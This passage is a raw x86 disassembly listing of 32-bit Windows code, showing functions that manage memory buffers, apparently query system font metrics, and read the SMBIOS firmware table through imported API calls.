  40160b:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  401611:	89 95 9c fd ff ff    	mov    %edx,-0x264(%ebp)
  401617:	6a 00                	push   $0x0
  401619:	50                   	push   %eax
  40161a:	8b d9                	mov    %ecx,%ebx
  40161c:	e8 3f c8 00 00       	call   0x40de60
  401621:	83 c4 0c             	add    $0xc,%esp
  401624:	c7 85 a0 fd ff ff f8 	movl   $0x1f8,-0x260(%ebp)
  40162b:	01 00 00 
  40162e:	8d 85 a0 fd ff ff    	lea    -0x260(%ebp),%eax
  401634:	6a 00                	push   $0x0
  401636:	50                   	push   %eax
  401637:	68 f8 01 00 00       	push   $0x1f8
  40163c:	6a 29                	push   $0x29
  40163e:	ff 15 24 12 42 00    	call   *0x421224
  401644:	85 c0                	test   %eax,%eax
  401646:	75 19                	jne    0x401661
  401648:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  40164e:	8b c3                	mov    %ebx,%eax
  401650:	5f                   	pop    %edi
  401651:	5e                   	pop    %esi
  401652:	5b                   	pop    %ebx
  401653:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401656:	33 cd                	xor    %ebp,%ecx
  401658:	e8 9e ab 00 00       	call   0x40c1fb
  40165d:	8b e5                	mov    %ebp,%esp
  40165f:	5d                   	pop    %ebp
  401660:	c3                   	ret
  401661:	8b 85 9c fd ff ff    	mov    -0x264(%ebp),%eax
  401667:	8d b5 38 ff ff ff    	lea    -0xc8(%ebp),%esi
  40166d:	b9 17 00 00 00       	mov    $0x17,%ecx
  401672:	8d 7d 98             	lea    -0x68(%ebp),%edi
  401675:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401677:	89 45 98             	mov    %eax,-0x68(%ebp)
  40167a:	8b 45 08             	mov    0x8(%ebp),%eax
  40167d:	89 45 9c             	mov    %eax,-0x64(%ebp)
  401680:	8b 45 0c             	mov    0xc(%ebp),%eax
  401683:	89 45 a8             	mov    %eax,-0x58(%ebp)
  401686:	8d 45 98             	lea    -0x68(%ebp),%eax
  401689:	50                   	push   %eax
  40168a:	ff 15 38 10 42 00    	call   *0x421038
  401690:	85 c0                	test   %eax,%eax
  401692:	74 b4                	je     0x401648
  401694:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401697:	5f                   	pop    %edi
  401698:	89 03                	mov    %eax,(%ebx)
  40169a:	33 cd                	xor    %ebp,%ecx
  40169c:	5e                   	pop    %esi
  40169d:	8b c3                	mov    %ebx,%eax
  40169f:	5b                   	pop    %ebx
  4016a0:	e8 56 ab 00 00       	call   0x40c1fb
  4016a5:	8b e5                	mov    %ebp,%esp
  4016a7:	5d                   	pop    %ebp
  4016a8:	c3                   	ret
  4016a9:	cc                   	int3
  4016aa:	cc                   	int3
  4016ab:	cc                   	int3
  4016ac:	cc                   	int3
  4016ad:	cc                   	int3
  4016ae:	cc                   	int3
  4016af:	cc                   	int3
  4016b0:	55                   	push   %ebp
  4016b1:	8b ec                	mov    %esp,%ebp
  4016b3:	6a ff                	push   $0xffffffff
  4016b5:	68 f8 03 42 00       	push   $0x4203f8
  4016ba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4016c0:	50                   	push   %eax
  4016c1:	83 ec 1c             	sub    $0x1c,%esp
  4016c4:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  4016c9:	33 c5                	xor    %ebp,%eax
  4016cb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4016ce:	53                   	push   %ebx
  4016cf:	56                   	push   %esi
  4016d0:	57                   	push   %edi
  4016d1:	50                   	push   %eax
  4016d2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4016d5:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4016db:	8b f9                	mov    %ecx,%edi
  4016dd:	c7 47 0c 00 00 00 00 	movl   $0x0,0xc(%edi)
  4016e4:	8d 5f 10             	lea    0x10(%edi),%ebx
  4016e7:	8b 07                	mov    (%edi),%eax
  4016e9:	6a 00                	push   $0x0
  4016eb:	89 47 04             	mov    %eax,0x4(%edi)
  4016ee:	8b 03                	mov    (%ebx),%eax
  4016f0:	6a 00                	push   $0x0
  4016f2:	68 42 4d 53 52       	push   $0x52534d42
  4016f7:	89 43 04             	mov    %eax,0x4(%ebx)
  4016fa:	ff 15 4c 11 42 00    	call   *0x42114c
  401700:	8b f0                	mov    %eax,%esi
  401702:	85 f6                	test   %esi,%esi
  401704:	75 07                	jne    0x40170d
  401706:	32 c0                	xor    %al,%al
  401708:	e9 f4 00 00 00       	jmp    0x401801
  40170d:	c1 e8 02             	shr    $0x2,%eax
  401710:	83 fe 04             	cmp    $0x4,%esi
  401713:	72 f1                	jb     0x401706
  401715:	51                   	push   %ecx
  401716:	0f 57 c0             	xorps  %xmm0,%xmm0
  401719:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401720:	50                   	push   %eax
  401721:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  401724:	66 0f d6 45 e4       	movq   %xmm0,-0x1c(%ebp)
  401729:	e8 32 03 00 00       	call   0x401a60
  40172e:	56                   	push   %esi
  40172f:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401736:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  401739:	56                   	push   %esi
  40173a:	68 42 4d 53 52       	push   $0x52534d42
  40173f:	ff 15 4c 11 42 00    	call   *0x42114c
  401745:	85 c0                	test   %eax,%eax
  401747:	0f 84 80 00 00 00    	je     0x4017cd
  40174d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401750:	3b f8                	cmp    %eax,%edi
  401752:	74 20                	je     0x401774
  401754:	8b cf                	mov    %edi,%ecx
  401756:	e8 a5 02 00 00       	call   0x401a00
  40175b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40175e:	89 37                	mov    %esi,(%edi)
  401760:	33 f6                	xor    %esi,%esi
  401762:	89 47 04             	mov    %eax,0x4(%edi)
  401765:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401768:	89 47 08             	mov    %eax,0x8(%edi)
  40176b:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40176e:	89 75 e8             	mov    %esi,-0x18(%ebp)
  401771:	89 75 ec             	mov    %esi,-0x14(%ebp)
  401774:	8b 4f 0c             	mov    0xc(%edi),%ecx
  401777:	8b 07                	mov    (%edi),%eax
  401779:	8b 14 88             	mov    (%eax,%ecx,4),%edx
  40177c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40177f:	e8 ac 00 00 00       	call   0x401830
  401784:	50                   	push   %eax
  401785:	8b cb                	mov    %ebx,%ecx
  401787:	e8 e4 01 00 00       	call   0x401970
  40178c:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40178f:	85 d2                	test   %edx,%edx
  401791:	74 29                	je     0x4017bc
  401793:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401796:	8b c2                	mov    %edx,%eax
  401798:	2b ca                	sub    %edx,%ecx
  40179a:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4017a0:	72 10                	jb     0x4017b2
  4017a2:	8b 52 fc             	mov    -0x4(%edx),%edx
  4017a5:	83 c1 23             	add    $0x23,%ecx
  4017a8:	2b c2                	sub    %edx,%eax
  4017aa:	83 c0 fc             	add    $0xfffffffc,%eax
  4017ad:	83 f8 1f             	cmp    $0x1f,%eax
  4017b0:	77 6b                	ja     0x40181d
  4017b2:	51                   	push   %ecx
  4017b3:	52                   	push   %edx
  4017b4:	e8 53 aa 00 00       	call   0x40c20c
  4017b9:	83 c4 08             	add    $0x8,%esp
  4017bc:	8b 03                	mov    (%ebx),%eax
  4017be:	3b 43 04             	cmp    0x4(%ebx),%eax
  4017c1:	74 0a                	je     0x4017cd
  4017c3:	83 c0 08             	add    $0x8,%eax
  4017c6:	b3 01                	mov    $0x1,%bl
  4017c8:	89 47 1c             	mov    %eax,0x1c(%edi)
  4017cb:	eb 02                	jmp    0x4017cf
  4017cd:	32 db                	xor    %bl,%bl
  4017cf:	85 f6                	test   %esi,%esi
  4017d1:	74 2c                	je     0x4017ff
  4017d3:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4017d6:	8b c6                	mov    %esi,%eax
  4017d8:	2b ce                	sub    %esi,%ecx
  4017da:	83 e1 fc             	and    $0xfffffffc,%ecx
  4017dd:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4017e3:	72 10                	jb     0x4017f5
  4017e5:	8b 76 fc             	mov    -0x4(%esi),%esi
  4017e8:	83 c1 23             	add    $0x23,%ecx
  4017eb:	2b c6                	sub    %esi,%eax
  4017ed:	83 c0 fc             	add    $0xfffffffc,%eax
  4017f0:	83 f8 1f             	cmp    $0x1f,%eax
  4017f3:	77 2d                	ja     0x401822
  4017f5:	51                   	push   %ecx
  4017f6:	56                   	push   %esi
  4017f7:	e8 10 aa 00 00       	call   0x40c20c
  4017fc:	83 c4 08             	add    $0x8,%esp
  4017ff:	8a c3                	mov    %bl,%al
  401801:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401804:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40180b:	59                   	pop    %ecx
  40180c:	5f                   	pop    %edi
  40180d:	5e                   	pop    %esi
  40180e:	5b                   	pop    %ebx
  40180f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401812:	33 cd                	xor    %ebp,%ecx
  401814:	e8 e2 a9 00 00       	call   0x40c1fb
  401819:	8b e5                	mov    %ebp,%esp
  40181b:	5d                   	pop    %ebp
  40181c:	c3                   	ret
  40181d:	e8 77 e9 00 00       	call   0x410199
  401822:	e8 72 e9 00 00       	call   0x410199
  401827:	cc                   	int3
  401828:	cc                   	int3
  401829:	cc                   	int3
  40182a:	cc                   	int3
  40182b:	cc                   	int3
  40182c:	cc                   	int3
  40182d:	cc                   	int3
  40182e:	cc                   	int3
  40182f:	cc                   	int3
  401830:	55                   	push   %ebp
  401831:	8b ec                	mov    %esp,%ebp
  401833:	83 ec 14             	sub    $0x14,%esp
  401836:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  40183b:	33 c5                	xor    %ebp,%eax
  40183d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401840:	53                   	push   %ebx
  401841:	56                   	push   %esi
  401842:	57                   	push   %edi
  401843:	6a 00                	push   $0x0
  401845:	6a 00                	push   $0x0
  401847:	8b da                	mov    %edx,%ebx
  401849:	8b f1                	mov    %ecx,%esi
  40184b:	53                   	push   %ebx
  40184c:	89 75 ec             	mov    %esi,-0x14(%ebp)
  40184f:	68 42 4d 53 52       	push   $0x52534d42
  401854:	89 75 ec             	mov    %esi,-0x14(%ebp)
  401857:	ff 15 48 11 42 00    	call   *0x421148
  40185d:	8b f8                	mov    %eax,%edi
  40185f:	85 ff                	test   %edi,%edi
  401861:	75 1b                	jne    0x40187e
  401863:	89 06                	mov    %eax,(%esi)
  401865:	89 46 04             	mov    %eax,0x4(%esi)
  401868:	89 46 08             	mov    %eax,0x8(%esi)
  40186b:	8b c6                	mov    %esi,%eax
  40186d:	5f                   	pop    %edi
  40186e:	5e                   	pop    %esi
  40186f:	5b                   	pop    %ebx
  401870:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401873:	33 cd                	xor    %ebp,%ecx
  401875:	e8 81 a9 00 00       	call   0x40c1fb
  40187a:	8b e5                	mov    %ebp,%esp
  40187c:	5d                   	pop    %ebp
  40187d:	c3                   	ret
  40187e:	51                   	push   %ecx
  40187f:	0f 57 c0             	xorps  %xmm0,%xmm0
  401882:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  401889:	57                   	push   %edi
  40188a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40188d:	66 0f d6 45 f0       	movq   %xmm0,-0x10(%ebp)
  401892:	e8 19 01 00 00       	call   0x4019b0
  401897:	57                   	push   %edi
  401898:	8b 7d f0             	mov    -0x10(%ebp),%edi
  40189b:	57                   	push   %edi
  40189c:	53                   	push   %ebx
  40189d:	68 42 4d 53 52       	push   $0x52534d42
  4018a2:	ff 15 48 11 42 00    	call   *0x421148
  4018a8:	85 c0                	test   %eax,%eax
  4018aa:	75 48                	jne    0x4018f4
  4018ac:	89 06                	mov    %eax,(%esi)
  4018ae:	89 46 04             	mov    %eax,0x4(%esi)
  4018b1:	89 46 08             	mov    %eax,0x8(%esi)
  4018b4:	85 ff                	test   %edi,%edi
  4018b6:	74 4a                	je     0x401902
  4018b8:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4018bb:	8b c7                	mov    %edi,%eax
  4018bd:	2b cf                	sub    %edi,%ecx
  4018bf:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4018c5:	72 10                	jb     0x4018d7
  4018c7:	8b 7f fc             	mov    -0x4(%edi),%edi
  4018ca:	83 c1 23             	add    $0x23,%ecx
  4018cd:	2b c7                	sub    %edi,%eax
  4018cf:	83 c0 fc             	add    $0xfffffffc,%eax
  4018d2:	83 f8 1f             	cmp    $0x1f,%eax
  4018d5:	77 3e                	ja     0x401915
  4018d7:	51                   	push   %ecx
  4018d8:	57                   	push   %edi
  4018d9:	e8 2e a9 00 00       	call   0x40c20c
  4018de:	83 c4 08             	add    $0x8,%esp
  4018e1:	8b c6                	mov    %esi,%eax
  4018e3:	5f                   	pop    %edi
  4018e4:	5e                   	pop    %esi
  4018e5:	5b                   	pop    %ebx
  4018e6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4018e9:	33 cd                	xor    %ebp,%ecx
  4018eb:	e8 0b a9 00 00       	call   0x40c1fb
  4018f0:	8b e5                	mov    %ebp,%esp
  4018f2:	5d                   	pop    %ebp
  4018f3:	c3                   	ret
  4018f4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4018f7:	89 46 04             	mov    %eax,0x4(%esi)
  4018fa:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4018fd:	89 3e                	mov    %edi,(%esi)
  4018ff:	89 46 08             	mov    %eax,0x8(%esi)
  401902:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401905:	8b c6                	mov    %esi,%eax
  401907:	5f                   	pop    %edi
  401908:	5e                   	pop    %esi
  401909:	33 cd                	xor    %ebp,%ecx
  40190b:	5b                   	pop    %ebx
  40190c:	e8 ea a8 00 00       	call   0x40c1fb
  401911:	8b e5                	mov    %ebp,%esp
  401913:	5d                   	pop    %ebp
  401914:	c3                   	ret
  401915:	e8 7f e8 00 00       	call   0x410199
  40191a:	cc                   	int3
  40191b:	cc                   	int3
  40191c:	cc                   	int3
  40191d:	cc                   	int3
  40191e:	cc                   	int3
  40191f:	cc                   	int3
  401920:	56                   	push   %esi
  401921:	8b f1                	mov    %ecx,%esi
  401923:	8b 06                	mov    (%esi),%eax
  401925:	85 c0                	test   %eax,%eax
  401927:	74 3d                	je     0x401966
  401929:	8b 4e 08             	mov    0x8(%esi),%ecx
  40192c:	2b c8                	sub    %eax,%ecx
  40192e:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401934:	72 12                	jb     0x401948
  401936:	8b 50 fc             	mov    -0x4(%eax),%edx
  401939:	83 c1 23             	add    $0x23,%ecx
  40193c:	2b c2                	sub    %edx,%eax
  40193e:	83 c0 fc             	add    $0xfffffffc,%eax
  401941:	83 f8 1f             	cmp    $0x1f,%eax
  401944:	77 22                	ja     0x401968
  401946:	8b c2                	mov    %edx,%eax
  401948:	51                   	push   %ecx
  401949:	50                   	push   %eax
  40194a:	e8 bd a8 00 00       	call   0x40c20c
  40194f:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  401955:	83 c4 08             	add    $0x8,%esp
  401958:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  40195f:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  401966:	5e                   	pop    %esi
  401967:	c3                   	ret
  401968:	e8 2c e8 00 00       	call   0x410199
  40196d:	cc                   	int3
  40196e:	cc                   	int3
  40196f:	cc                   	int3
  401970:	55                   	push   %ebp
  401971:	8b ec                	mov    %esp,%ebp
  401973:	56                   	push   %esi
  401974:	57                   	push   %edi
  401975:	8b 7d 08             	mov    0x8(%ebp),%edi
  401978:	8b f1                	mov    %ecx,%esi
  40197a:	3b f7                	cmp    %edi,%esi
  40197c:	74 29                	je     0x4019a7
  40197e:	e8 9d ff ff ff       	call   0x401920
  401983:	8b 07                	mov    (%edi),%eax
  401985:	89 06                	mov    %eax,(%esi)
  401987:	8b 47 04             	mov    0x4(%edi),%eax
  40198a:	89 46 04             	mov    %eax,0x4(%esi)
  40198d:	8b 47 08             	mov    0x8(%edi),%eax
  401990:	89 46 08             	mov    %eax,0x8(%esi)
  401993:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  401999:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  4019a0:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  4019a7:	5f                   	pop    %edi
  4019a8:	8b c6                	mov    %esi,%eax
  4019aa:	5e                   	pop    %esi
  4019ab:	5d                   	pop    %ebp
  4019ac:	c2 04 00             	ret    $0x4
  4019af:	cc                   	int3
  4019b0:	55                   	push   %ebp
  4019b1:	8b ec                	mov    %esp,%ebp
  4019b3:	53                   	push   %ebx
  4019b4:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4019b7:	57                   	push   %edi
  4019b8:	8b f9                	mov    %ecx,%edi
  4019ba:	53                   	push   %ebx
  4019bb:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  4019c1:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  4019c8:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  4019cf:	e8 2c 01 00 00       	call   0x401b00
  4019d4:	84 c0                	test   %al,%al
  4019d6:	74 16                	je     0x4019ee
  4019d8:	56                   	push   %esi
  4019d9:	8b 37                	mov    (%edi),%esi
  4019db:	53                   	push   %ebx
  4019dc:	6a 00                	push   $0x0
  4019de:	56                   	push   %esi
  4019df:	e8 7c c4 00 00       	call   0x40de60
  4019e4:	83 c4 0c             	add    $0xc,%esp
  4019e7:	8d 04 1e             	lea    (%esi,%ebx,1),%eax
  4019ea:	89 47 04             	mov    %eax,0x4(%edi)
  4019ed:	5e                   	pop    %esi
  4019ee:	8b c7                	mov    %edi,%eax
  4019f0:	5f                   	pop    %edi
  4019f1:	5b                   	pop    %ebx
  4019f2:	5d                   	pop    %ebp
  4019f3:	c2 08 00             	ret    $0x8
  4019f6:	cc                   	int3
  4019f7:	cc                   	int3
  4019f8:	cc                   	int3
  4019f9:	cc                   	int3
  4019fa:	cc                   	int3
  4019fb:	cc                   	int3
  4019fc:	cc                   	int3
  4019fd:	cc                   	int3
  4019fe:	cc                   	int3
  4019ff:	cc                   	int3
  401a00:	56                   	push   %esi
  401a01:	8b f1                	mov    %ecx,%esi
  401a03:	8b 06                	mov    (%esi),%eax
  401a05:	85 c0                	test   %eax,%eax
  401a07:	74 40                	je     0x401a49
  401a09:	8b 56 08             	mov    0x8(%esi),%edx
  401a0c:	2b d0                	sub    %eax,%edx
  401a0e:	83 e2 fc             	and    $0xfffffffc,%edx
  401a11:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  401a17:	72 12                	jb     0x401a2b
  401a19:	8b 48 fc             	mov    -0x4(%eax),%ecx
  401a1c:	83 c2 23             	add    $0x23,%edx
  401a1f:	2b c1                	sub    %ecx,%eax
  401a21:	83 c0 fc             	add    $0xfffffffc,%eax
  401a24:	83 f8 1f             	cmp    $0x1f,%eax
  401a27:	77 22                	ja     0x401a4b
  401a29:	8b c1                	mov    %ecx,%eax
  401a2b:	52                   	push   %edx
  401a2c:	50                   	push   %eax
  401a2d:	e8 da a7 00 00       	call   0x40c20c
  401a32:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  401a38:	83 c4 08             	add    $0x8,%esp
  401a3b:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  401a42:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  401a49:	5e                   	pop    %esi
  401a4a:	c3                   	ret
  401a4b:	e8 49 e7 00 00       	call   0x410199
  401a50:	cc                   	int3
  401a51:	cc                   	int3
  401a52:	cc                   	int3
  401a53:	cc                   	int3
  401a54:	cc                   	int3
  401a55:	cc                   	int3
  401a56:	cc                   	int3
  401a57:	cc                   	int3
  401a58:	cc                   	int3
  401a59:	cc                   	int3
  401a5a:	cc                   	int3
  401a5b:	cc                   	int3
  401a5c:	cc                   	int3
  401a5d:	cc                   	int3
  401a5e:	cc                   	int3
  401a5f:	cc                   	int3
  401a60:	55                   	push   %ebp
  401a61:	8b ec                	mov    %esp,%ebp
  401a63:	53                   	push   %ebx
  401a64:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401a67:	57                   	push   %edi
  401a68:	8b f9                	mov    %ecx,%edi
  401a6a:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  401a70:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  401a77:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  401a7e:	85 db                	test   %ebx,%ebx
  401a80:	74 6b                	je     0x401aed
  401a82:	81 fb ff ff ff 3f    	cmp    $0x3fffffff,%ebx
  401a88:	77 6b                	ja     0x401af5
  401a8a:	c1 e3 02             	shl    $0x2,%ebx
  401a8d:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  401a93:	72 25                	jb     0x401aba
  401a95:	8d 43 23             	lea    0x23(%ebx),%eax
  401a98:	83 c9 ff             	or     $0xffffffff,%ecx
  401a9b:	3b c3                	cmp    %ebx,%eax
  401a9d:	0f 46 c1             	cmovbe %ecx,%eax
  401aa0:	50                   	push   %eax
  401aa1:	e8 74 a7 00 00       	call   0x40c21a
  401aa6:	8b c8                	mov    %eax,%ecx
  401aa8:	83 c4 04             	add    $0x4,%esp
  401aab:	85 c9                	test   %ecx,%ecx
  401aad:	74 4b                	je     0x401afa
  401aaf:	8d 41 23             	lea    0x23(%ecx),%eax
  401ab2:	83 e0 e0             	and    $0xffffffe0,%eax
  401ab5:	89 48 fc             	mov    %ecx,-0x4(%eax)
  401ab8:	eb 11                	jmp    0x401acb
  401aba:	85 db                	test   %ebx,%ebx
  401abc:	74 0b                	je     0x401ac9
  401abe:	53                   	push   %ebx
  401abf:	e8 56 a7 00 00       	call   0x40c21a
  401ac4:	83 c4 04             	add    $0x4,%esp
  401ac7:	eb 02                	jmp    0x401acb
  401ac9:	33 c0                	xor    %eax,%eax
  401acb:	89 07                	mov    %eax,(%edi)
  401acd:	89 47 04             	mov    %eax,0x4(%edi)
  401ad0:	8b 07                	mov    (%edi),%eax
  401ad2:	56                   	push   %esi
  401ad3:	03 c3                	add    %ebx,%eax
  401ad5:	53                   	push   %ebx
  401ad6:	89 47 08             	mov    %eax,0x8(%edi)
  401ad9:	8b 37                	mov    (%edi),%esi
  401adb:	6a 00                	push   $0x0
  401add:	56                   	push   %esi
  401ade:	e8 7d c3 00 00       	call   0x40de60
  401ae3:	83 c4 0c             	add    $0xc,%esp
  401ae6:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  401ae9:	89 47 04             	mov    %eax,0x4(%edi)
  401aec:	5e                   	pop    %esi
  401aed:	8b c7                	mov    %edi,%eax
  401aef:	5f                   	pop    %edi
  401af0:	5b                   	pop    %ebx
  401af1:	5d                   	pop    %ebp
  401af2:	c2 08 00             	ret    $0x8
  401af5:	e8 d6 fa ff ff       	call   0x4015d0
  401afa:	e8 9a e6 00 00       	call   0x410199
  401aff:	cc                   	int3
  401b00:	55                   	push   %ebp
  401b01:	8b ec                	mov    %esp,%ebp
  401b03:	56                   	push   %esi
  401b04:	8b f1                	mov    %ecx,%esi
  401b06:	57                   	push   %edi
  401b07:	8b 7d 08             	mov    0x8(%ebp),%edi
  401b0a:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  401b10:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  401b17:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  401b1e:	85 ff                	test   %edi,%edi
  401b20:	75 08                	jne    0x401b2a
  401b22:	5f                   	pop    %edi
  401b23:	32 c0                	xor    %al,%al
  401b25:	5e                   	pop    %esi
  401b26:	5d                   	pop    %ebp
  401b27:	c2 04 00             	ret    $0x4
  401b2a:	81 ff ff ff ff 7f    	cmp    $0x7fffffff,%edi
  401b30:	77 5c                	ja     0x401b8e
  401b32:	81 ff 00 10 00 00    	cmp    $0x1000,%edi
  401b38:	72 37                	jb     0x401b71
  401b3a:	8d 47 23             	lea    0x23(%edi),%eax
  401b3d:	83 c9 ff             	or     $0xffffffff,%ecx
  401b40:	3b c7                	cmp    %edi,%eax
  401b42:	0f 46 c1             	cmovbe %ecx,%eax
  401b45:	50                   	push   %eax
  401b46:	e8 cf a6 00 00       	call   0x40c21a
  401b4b:	8b c8                	mov    %eax,%ecx
  401b4d:	83 c4 04             	add    $0x4,%esp
  401b50:	85 c9                	test   %ecx,%ecx
  401b52:	74 3f                	je     0x401b93
  401b54:	8d 41 23             	lea    0x23(%ecx),%eax
  401b57:	83 e0 e0             	and    $0xffffffe0,%eax
  401b5a:	89 48 fc             	mov    %ecx,-0x4(%eax)
  401b5d:	89 06                	mov    %eax,(%esi)
  401b5f:	89 46 04             	mov    %eax,0x4(%esi)
  401b62:	8b 06                	mov    (%esi),%eax
  401b64:	03 c7                	add    %edi,%eax
  401b66:	89 46 08             	mov    %eax,0x8(%esi)
  401b69:	b0 01                	mov    $0x1,%al
  401b6b:	5f                   	pop    %edi
  401b6c:	5e                   	pop    %esi
  401b6d:	5d                   	pop    %ebp
  401b6e:	c2 04 00             	ret    $0x4
  401b71:	57                   	push   %edi
  401b72:	e8 a3 a6 00 00       	call   0x40c21a
  401b77:	89 06                	mov    %eax,(%esi)
  401b79:	83 c4 04             	add    $0x4,%esp
  401b7c:	89 46 04             	mov    %eax,0x4(%esi)
  401b7f:	8b 06                	mov    (%esi),%eax
  401b81:	03 c7                	add    %edi,%eax
  401b83:	89 46 08             	mov    %eax,0x8(%esi)
  401b86:	b0 01                	mov    $0x1,%al
  401b88:	5f                   	pop    %edi
  401b89:	5e                   	pop    %esi
  401b8a:	5d                   	pop    %ebp
  401b8b:	c2 04 00             	ret    $0x4
  401b8e:	e8 3d fa ff ff       	call   0x4015d0
  401b93:	e8 01 e6 00 00       	call   0x410199
  401b98:	cc                   	int3
  401b99:	cc                   	int3
  401b9a:	cc                   	int3
  401b9b:	cc                   	int3
  401b9c:	cc                   	int3
  401b9d:	cc                   	int3
  401b9e:	cc                   	int3
  401b9f:	cc                   	int3
  401ba0:	83 39 00             	cmpl   $0x0,(%ecx)
  401ba3:	7c 06                	jl     0x401bab
  401ba5:	ff 25 a4 12 42 00    	jmp    *0x4212a4
  401bab:	c3                   	ret
  401bac:	cc                   	int3
  401bad:	cc                   	int3
  401bae:	cc                   	int3
  401baf:	cc                   	int3
  401bb0:	55                   	push   %ebp
  401bb1:	8b ec                	mov    %esp,%ebp
  401bb3:	6a 00                	push   $0x0
  401bb5:	6a 00                	push   $0x0
  401bb7:	ff 75 0c             	push   0xc(%ebp)
  401bba:	ff 75 08             	push   0x8(%ebp)
  401bbd:	ff 15 44 11 42 00    	call   *0x421144
  401bc3:	5d                   	pop    %ebp
  401bc4:	c3                   	ret
  401bc5:	cc                   	int3
  401bc6:	cc                   	int3
  401bc7:	cc                   	int3
  401bc8:	cc                   	int3
  401bc9:	cc                   	int3
  401bca:	cc                   	int3
  401bcb:	cc                   	int3
  401bcc:	cc                   	int3
  401bcd:	cc                   	int3
  401bce:	cc                   	int3
  401bcf:	cc                   	int3
  401bd0:	6a 00                	push   $0x0
  401bd2:	6a 00                	push   $0x0
  401bd4:	51                   	push   %ecx
  401bd5:	ff 15 40 10 42 00    	call   *0x421040
  401bdb:	85 c0                	test   %eax,%eax
  401bdd:	75 13                	jne    0x401bf2
  401bdf:	ff 15 cc 10 42 00    	call   *0x4210cc
  401be5:	85 c0                	test   %eax,%eax
  401be7:	7e 0b                	jle    0x401bf4
  401be9:	0f b7 c0             	movzwl %ax,%eax
  401bec:	0d 00 00 07 80       	or     $0x80070000,%eax
  401bf1:	c3                   	ret
  401bf2:	33 c0                	xor    %eax,%eax
  401bf4:	c3                   	ret
  401bf5:	cc                   	int3
  401bf6:	cc                   	int3
  401bf7:	cc                   	int3
  401bf8:	cc                   	int3
  401bf9:	cc                   	int3
  401bfa:	cc                   	int3
  401bfb:	cc                   	int3
  401bfc:	cc                   	int3
  401bfd:	cc                   	int3
  401bfe:	cc                   	int3
  401bff:	cc                   	int3
  401c00:	55                   	push   %ebp
  401c01:	8b ec                	mov    %esp,%ebp
  401c03:	ff 75 08             	push   0x8(%ebp)
  401c06:	6a 00                	push   $0x0
  401c08:	ff 71 04             	push   0x4(%ecx)
  401c0b:	ff 15 58 10 42 00    	call   *0x421058
  401c11:	5d                   	pop    %ebp
  401c12:	c2 04 00             	ret    $0x4
  401c15:	cc                   	int3
  401c16:	cc                   	int3
  401c17:	cc                   	int3
  401c18:	cc                   	int3
  401c19:	cc                   	int3
  401c1a:	cc                   	int3
  401c1b:	cc                   	int3
  401c1c:	cc                   	int3
  401c1d:	cc                   	int3
  401c1e:	cc                   	int3
  401c1f:	cc                   	int3
  401c20:	55                   	push   %ebp
  401c21:	8b ec                	mov    %esp,%ebp
  401c23:	8b 45 08             	mov    0x8(%ebp),%eax
  401c26:	85 c0                	test   %eax,%eax
  401c28:	74 0c                	je     0x401c36
  401c2a:	50                   	push   %eax
  401c2b:	6a 00                	push   $0x0
  401c2d:	ff 71 04             	push   0x4(%ecx)
  401c30:	ff 15 5c 10 42 00    	call   *0x42105c
